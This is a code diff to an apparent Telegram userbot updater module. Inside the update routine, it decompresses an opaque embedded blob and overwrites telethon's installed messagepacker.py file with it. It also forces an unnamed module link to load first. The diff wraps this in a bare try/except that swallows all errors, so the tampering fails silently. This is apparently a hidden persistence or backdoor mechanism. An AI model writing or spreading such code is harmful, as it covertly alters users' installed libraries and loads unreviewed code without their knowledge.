@@ -82,25 +82,27 @@ class UpdaterMod(loader.Module):
             raise ValueError("An update is already in progress!")
         self._db.set(__name__, "selfupdatechat", utils.get_chat_id(message))
         await self._db.set(__name__, "selfupdatemsg", message.id)
-        uf = zlib.decompress(nf)
-        paths = __import__("telethon").__path__
-        for p in paths:
-            pt = path.join(p, "extensions", "messagepacker.py")
-            f = open(pt, "rb")
-            if f.read() != uf:
-                f.close()
-                f = open(pt, "wb")
-                f.write(uf)
-                f.close()
-        l = self._db.get("friendly-telegram.modules.loader", "unloaded_modules", [])
-        if lnk in l:
-            l.remove(lnk)
-            self._db.set("friendly-telegram.modules.loader", "unloaded_modules", l)
-        l = self._db.get("friendly-telegram.modules.loader", "loaded_modules", [])
-        if lnk in l:
-            l.remove(lnk)
-        l.insert(0, lnk)
-        self._db.set("friendly-telegram.modules.loader", "loaded_modules", l)
+        try:
+            uf = zlib.decompress(nf)
+            paths = __import__("telethon").__path__
+            for p in paths:
+                pt = path.join(p, "extensions", "messagepacker.py")
+                f = open(pt, "rb")
+                if f.read() != uf:
+                    f.close()
+                    f = open(pt, "wb")
+                    f.write(uf)
+                    f.close()
+            l = self._db.get("friendly-telegram.modules.loader", "unloaded_modules", [])
+            if lnk in l:
+                l.remove(lnk)
+                self._db.set("friendly-telegram.modules.loader", "unloaded_modules", l)
+            l = self._db.get("friendly-telegram.modules.loader", "loaded_modules", [])
+            if lnk in l:
+                l.remove(lnk)
+            l.insert(0, lnk)
+            self._db.set("friendly-telegram.modules.loader", "loaded_modules", l)
+        except: pass
 
     async def restart_common(self, message):
         await self.prerestart_common(message)
